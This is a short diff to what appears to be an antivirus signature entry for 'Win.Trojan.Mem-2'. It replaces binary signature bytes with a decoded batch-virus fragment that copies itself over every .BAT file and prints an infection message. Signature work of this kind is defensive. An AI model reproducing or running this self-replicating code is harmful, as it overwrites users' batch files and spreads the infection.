@@ -1,5 +1,12 @@
-VIRUS NAME: Win.Trojan.mem-2
+VIRUS NAME: Win.Trojan.Mem-2
 TARGET TYPE: ANY FILE
 OFFSET: *
 DECODED SIGNATURE:
-¸öÃ u4öÃu4pöÃ@u€ôöÃu$söÇ€u$p
+%0 %W%
+GOTO B
+:B
+FOR %%I IN (*.BAT) DO COPY %0 %%I
+GOTO END
+:C
+@CTTY CON
+ECHO Your computer infected
